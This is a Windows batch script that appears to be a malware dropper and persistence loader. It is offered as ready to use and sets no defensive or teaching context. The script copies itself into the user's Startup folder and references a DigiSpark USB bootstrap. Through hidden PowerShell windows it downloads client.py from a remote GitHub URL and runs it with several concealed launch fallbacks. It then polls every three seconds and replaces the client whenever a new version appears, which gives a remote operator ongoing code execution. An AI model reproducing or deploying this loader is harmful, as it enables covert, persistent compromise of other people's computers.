@echo off
setlocal enabledelayedexpansion

rem Operator: ensure client.py exists and is running; poll every 3s for updates; replace on change
rem Includes:
rem - Robust python detection (pythonw/python/py -3.11)
rem - Force-start immediately after first download
rem - Custom command variables so you can specify exactly how to run client.py

set "url=https://raw.githubusercontent.com/sky9262/abc/main/client.py"
set "base=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "target=%base%\client.py"
set "pidfile=%base%\client.pid"
set "log=%base%\operator.log"

rem ===== Custom command configuration (choose ONE) =====
rem 1) COMMAND: full command string executed in Startup folder, e.g.:
rem    set "COMMAND=py -3.11 client.py"
rem 2) LAUNCH_CMD_FULL: full command string (similar to COMMAND). You can use "%target%" or "client.py", e.g.:
rem    set "LAUNCH_CMD_FULL=py -3.11 ""%target%"""
rem 3) LAUNCH_CMD: prefix only; the script appends the quoted client path, e.g.:
rem    set "LAUNCH_CMD=py -3.11"
set "COMMAND=py -3.11 client.py"
set "LAUNCH_CMD_FULL="
set "LAUNCH_CMD=python"
rem =====================================================

if not exist "%base%" mkdir "%base%" >nul 2>&1

rem Self-install to Startup if running from elsewhere (supports DigiSpark temp bootstrap)
set "SELF=%~f0"
set "OP_PATH=%base%\operator.bat"
if /I not "%SELF%"=="%OP_PATH%" (
  copy /y "%SELF%" "%OP_PATH%" >nul 2>&1
  start "" "%OP_PATH%"
  exit /b
)

:mainloop
rem ========== Loop start ==========
echo [%date% %time%] Loop start >> "%log%"

rem 1) Ensure client.py exists (download if missing)
if not exist "%target%" (
  echo [%date% %time%] client.py missing; downloading from %url% >> "%log%"
  powershell -NoProfile -WindowStyle Hidden -Command "$u='%url%'; try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u=$u+'?t='+[guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile '%target%' -ErrorAction Stop }catch{}" >nul 2>&1
  if exist "%target%" (
    echo [%date% %time%] Downloaded client.py to "%target%" >> "%log%"
    rem Force a start immediately after first download (bypass detection edge-cases)
    call :try_start
  ) else (
    echo [%date% %time%] Download attempt failed (file still missing) >> "%log%"
  )
)

rem 2) Ensure client.py is running (by command-line match)
set "RUNNING=0"
powershell -NoProfile -WindowStyle Hidden -Command "$t=[regex]::Escape($env:target); $r=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match $t } | Select-Object -First 1; if($r){exit 0}else{exit 1}" >nul 2>&1
if not errorlevel 1 set "RUNNING=1"

if "%RUNNING%"=="1" (
  echo [%date% %time%] client.py already running >> "%log%"
) else (
  echo [%date% %time%] client.py not running; attempting start >> "%log%"
  call :try_start

  rem Verify running after attempts
  set "RUNNING=0"
  powershell -NoProfile -WindowStyle Hidden -Command "$t=[regex]::Escape($env:target); $r=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match $t } | Select-Object -First 1; if($r){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 set "RUNNING=1"

  if "%RUNNING%"=="1" (
    echo [%date% %time%] Confirmed client.py is running >> "%log%"
  ) else (
    echo [%date% %time%] ERROR: Failed to start client.py by all methods >> "%log%"
  )
)

rem 3) Poll for new version and compare against current (update flow)
set "temp=%TEMP%\client_new_%RANDOM%.py"
powershell -NoProfile -WindowStyle Hidden -Command "$u='%url%'; try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u=$u+'?t='+[guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile '%temp%' -ErrorAction Stop }catch{}" >nul 2>&1

if exist "%temp%" (
  set "DIFF=0"
  if exist "%target%" (
    powershell -NoProfile -Command "$h1=(Get-FileHash -Algorithm SHA256 -Path '%temp%').Hash; $h2=(Get-FileHash -Algorithm SHA256 -Path '%target%').Hash; if($h1 -ne $h2){exit 1}else{exit 0}" >nul 2>&1
    if errorlevel 1 set "DIFF=1"
  ) else (
    set "DIFF=1"
  )

  if "!DIFF!"=="1" (
    echo [%date% %time%] Update detected; replacing client.py and restarting >> "%log%"

    rem 3a) Stop current client
    if exist "%pidfile%" (
      for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
      if defined CPID powershell -NoProfile -WindowStyle Hidden -Command "try{Stop-Process -Id $env:CPID -Force -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
      del /f /q "%pidfile%" >nul 2>&1
      echo [%date% %time%] Stopped PID %CPID% and cleared pidfile >> "%log%"
    )
    powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }" >nul 2>&1

    rem 3b) Replace current file with new
    del /f /q "%target%" >nul 2>&1
    move /y "%temp%" "%target%" >nul 2>&1
    echo [%date% %time%] Replaced client.py with new version >> "%log%"

    rem 3c) Jump to start to re-ensure presence and process start
    timeout /t 1 /nobreak >nul 2>&1
    goto mainloop
  ) else (
    del /f /q "%temp%" >nul 2>&1
  )
)

rem 4) Wait 3 seconds and repeat (continuous monitoring)
timeout /t 3 /nobreak >nul 2>&1
goto mainloop

rem ===== Subroutines =====
:try_start
set "STARTED=0"

rem Attempt 0A: Custom COMMAND (full string)
if "%STARTED%"=="0" (
  if defined COMMAND (
    echo [%date% %time%] Attempt: Custom COMMAND => %COMMAND% >> "%log%"
    powershell -NoProfile -WindowStyle Hidden -Command "$cmd=$env:COMMAND; if([string]::IsNullOrWhiteSpace($cmd)){exit 1}; try{ Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c',$cmd) -WorkingDirectory $env:base -WindowStyle Hidden | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 }" >nul 2>&1
    if not errorlevel 1 (
      set "STARTED=1"
      set "CPID="
      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
      echo [%date% %time%] Started via custom COMMAND PID=!CPID! >> "%log%"
    ) else (
      echo [%date% %time%] Custom COMMAND failed >> "%log%"
    )
  )
)

rem Attempt 0B: Custom LAUNCH_CMD_FULL (full string)
if "%STARTED%"=="0" (
  if defined LAUNCH_CMD_FULL (
    echo [%date% %time%] Attempt: Custom LAUNCH_CMD_FULL => %LAUNCH_CMD_FULL% >> "%log%"
    powershell -NoProfile -WindowStyle Hidden -Command "$cmd=$env:LAUNCH_CMD_FULL; if([string]::IsNullOrWhiteSpace($cmd)){exit 1}; try{ Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c',$cmd) -WorkingDirectory $env:base -WindowStyle Hidden | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 }" >nul 2>&1
    if not errorlevel 1 (
      set "STARTED=1"
      set "CPID="
      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
      echo [%date% %time%] Started via LAUNCH_CMD_FULL PID=!CPID! >> "%log%"
    ) else (
      echo [%date% %time%] LAUNCH_CMD_FULL failed >> "%log%"
    )
  )
)

rem Attempt 0C: Custom LAUNCH_CMD (prefix only, script appends client path)
if "%STARTED%"=="0" (
  if defined LAUNCH_CMD (
    echo [%date% %time%] Attempt: Custom LAUNCH_CMD + target => %LAUNCH_CMD% "client.py" >> "%log%"
    powershell -NoProfile -WindowStyle Hidden -Command "$prefix=$env:LAUNCH_CMD; if([string]::IsNullOrWhiteSpace($prefix)){exit 1}; $cmd=$prefix + ' ""' + $env:target + '""'; try{ Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c',$cmd) -WorkingDirectory $env:base -WindowStyle Hidden | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 }" >nul 2>&1
    if not errorlevel 1 (
      set "STARTED=1"
      set "CPID="
      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
      echo [%date% %time%] Started via LAUNCH_CMD PID=!CPID! >> "%log%"
    ) else (
      echo [%date% %time%] LAUNCH_CMD failed >> "%log%"
    )
  )
)

rem Attempt A: pythonw.exe
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: pythonw.exe >> "%log%"
  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command pythonw -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @($env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
  if not errorlevel 1 (
    set "STARTED=1"
    set "CPID="
    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
    echo [%date% %time%] Started via pythonw.exe PID=!CPID! >> "%log%"
  )
)

rem Attempt B: python.exe
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: python.exe >> "%log%"
  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command python -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @($env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
  if not errorlevel 1 (
    set "STARTED=1"
    set "CPID="
    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
    echo [%date% %time%] Started via python.exe PID=!CPID! >> "%log%"
  )
)

rem Attempt C: py.exe (PATH) -3.11
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: py.exe (PATH) -3.11 >> "%log%"
  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command py -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @('-3.11',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
  if not errorlevel 1 (
    set "STARTED=1"
    set "CPID="
    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
    echo [%date% %time%] Started via py.exe (PATH) -3.11 PID=!CPID! >> "%log%"
  )
)

rem Attempt C2: py.exe (PATH) -3
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: py.exe (PATH) -3 >> "%log%"
  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command py -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @('-3',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
  if not errorlevel 1 (
    set "STARTED=1"
    set "CPID="
    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
    echo [%date% %time%] Started via py.exe (PATH) PID=!CPID! >> "%log%"
  )
)

rem Attempt D: C:\Windows\py.exe -3.11
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: C:\Windows\py.exe -3.11 >> "%log%"
  if exist "C:\Windows\py.exe" (
    powershell -NoProfile -WindowStyle Hidden -Command "try{ $p=Start-Process -FilePath 'C:\Windows\py.exe' -ArgumentList @('-3.11',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru }catch{}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } else { exit 1 }" >nul 2>&1
    if not errorlevel 1 (
      set "STARTED=1"
      set "CPID="
      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
      echo [%date% %time%] Started via C:\Windows\py.exe -3.11 PID=!CPID! >> "%log%"
    )
  ) else (
    echo [%date% %time%] C:\Windows\py.exe not found >> "%log%"
  )
)

rem Attempt D2: C:\Windows\py.exe -3
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: C:\Windows\py.exe -3 >> "%log%"
  if exist "C:\Windows\py.exe" (
    powershell -NoProfile -WindowStyle Hidden -Command "try{ $p=Start-Process -FilePath 'C:\Windows\py.exe' -ArgumentList @('-3',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru }catch{}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } else { exit 1 }" >nul 2>&1
    if not errorlevel 1 (
      set "STARTED=1"
      set "CPID="
      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
      echo [%date% %time%] Started via C:\Windows\py.exe PID=!CPID! >> "%log%"
    )
  ) else (
    echo [%date% %time%] C:\Windows\py.exe not found >> "%log%"
  )
)

rem Attempt E: COM file-association fallback (hidden)
if "%STARTED%"=="0" (
  echo [%date% %time%] Attempt: COM WScript.Shell.Run (file association) >> "%log%"
  powershell -NoProfile -WindowStyle Hidden -Command "$ws=$null; try{ $ws=New-Object -ComObject WScript.Shell }catch{}; if($ws){ try{ $ws.Run(('""' + $env:target + '""'),0,$false) | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 } } else { exit 1 }" >nul 2>&1
  if not errorlevel 1 (
    set "STARTED=1"
    set "CPID="
    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
    echo [%date% %time%] Started via COM association PID=!CPID! >> "%log%"
  ) else (
    echo [%date% %time%] COM association fallback failed to yield process >> "%log%"
  )
)

goto :eof
